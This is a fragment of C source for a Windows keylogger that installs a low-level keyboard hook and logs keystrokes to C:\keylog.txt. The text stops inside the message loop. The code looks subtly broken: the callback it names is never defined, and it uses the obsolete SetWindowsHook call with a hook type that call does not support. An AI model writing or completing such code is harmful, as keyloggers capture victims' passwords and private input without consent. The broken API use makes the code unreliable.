#include <windows.h>
#include <stdio.h>

#define FILE_KEYLOG "C:\\keylog.txt"

int main() {
    FILE *file = fopen(FILE_KEYLOG, "a");
    if (!file) {
        printf("Failed to create file\n");
        return 1;
    }

    HHOOK hook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardCallback);

    if (!hook) {
        printf("Failed to install hook\n");
        fclose(file);
        return 1;
    }

    MSG msg;
    DWORD lastError = 0;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
